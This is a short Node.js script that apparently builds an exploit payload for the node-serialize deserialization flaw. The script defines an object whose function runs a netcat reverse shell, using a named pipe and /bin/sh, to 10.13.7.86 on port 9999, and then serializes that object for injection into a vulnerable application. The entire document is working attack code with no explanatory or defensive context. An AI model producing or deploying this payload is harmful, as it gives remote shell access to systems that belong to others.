var y = {
    email: function(){
        require('child_process').exec('mkfifo /tmp/kirxhbg; nc 10.13.7.86 9999 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg');
            return 1;
    },
}
var serialize = require('node-serialize');
console.log(serialize.serialize(y));